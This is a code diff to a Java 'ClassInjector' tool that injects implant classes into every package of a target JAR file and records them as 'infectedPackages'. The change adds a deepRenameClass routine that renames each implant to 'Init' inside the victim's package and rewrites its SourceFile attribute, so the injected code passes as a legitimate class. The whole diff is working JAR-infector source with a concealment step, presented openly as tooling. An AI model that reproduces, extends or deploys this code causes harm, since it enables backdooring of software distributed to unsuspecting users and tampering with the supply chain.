@@ -7,6 +7,7 @@ import org.example.implants.ClassImplant;
 import java.io.DataInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
+import java.nio.ByteOrder;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.util.Arrays;
@@ -73,12 +74,11 @@ public class ClassInjector {
 
                     String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                     if (!infectedPackages.containsKey(targetPackageName)) {
-                        ClassFile implantComponent = ImplantReader.findAndReadClassFile(implantComponentClass); // TODO Optimize this
-                        String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
-                        implantComponent.setName(targetPackageName + "." + implantComponentClassName);
-                        JarEntry newJarEntry = convertToJarEntry(implantComponent);
-                        implantComponent.write(fiddler.addNewEntry(newJarEntry));
-                        infectedPackages.put(targetPackageName, implantComponent);
+                        ClassFile implant = ImplantReader.findAndReadClassFile(implantComponentClass);
+                        deepRenameClass(implant, targetPackageName, "Init");
+                        JarEntry newJarEntry = convertToJarEntry(implant);
+                        implant.write(fiddler.addNewEntry(newJarEntry));
+                        infectedPackages.put(targetPackageName, implant);
                         System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");
                     }
 
@@ -137,6 +137,35 @@ public class ClassInjector {
         targetClass.write(jarEntry.addOnly());
     }
 
+    private static void deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
+        String newFqcn = newPackageName + "." + newClassName;
+        String newSourceFileName = newClassName + ".java";
+
+        AttributeInfo sourceFileAttr = classFile.getAttribute(SourceFileAttribute.tag);
+        if (sourceFileAttr != null) {
+            ByteBuffer sourceFileInfo = ByteBuffer.wrap(sourceFileAttr.get());
+            sourceFileInfo.order(ByteOrder.BIG_ENDIAN);
+            if (sourceFileInfo.limit() != 2) {
+                throw new RuntimeException("Unexpected SourceFileAttribute length: " + sourceFileInfo.limit());
+            }
+            int fileNameIndex = sourceFileInfo.getShort();
+            String fileName = classFile.getConstPool().getUtf8Info(fileNameIndex);
+            String expectedName = parseClassNameFromFqcn(classFile.getName());
+            if (!fileName.startsWith(expectedName)) {
+                throw new RuntimeException("Unexpected SourceFileAttribute: Expected class to start with '" + expectedName + "'.");
+            }
+            int newClassNameIndex = classFile.getConstPool().addUtf8Info(newSourceFileName);
+            if (newClassNameIndex < 0 || newClassNameIndex > 65535) {
+                throw new RuntimeException("Unexpected index in ConstPool: " + newClassNameIndex);
+            }
+            sourceFileInfo.flip();
+            sourceFileInfo.putShort((short) newClassNameIndex);
+            sourceFileAttr.set(sourceFileInfo.array());
+        }
+
+        classFile.setName(newFqcn);
+        classFile.compact();
+    }
 
     private static String parsePackageNameFromFqcn(final String fqcn) {
         String[] parts = fqcn.split("\\.");
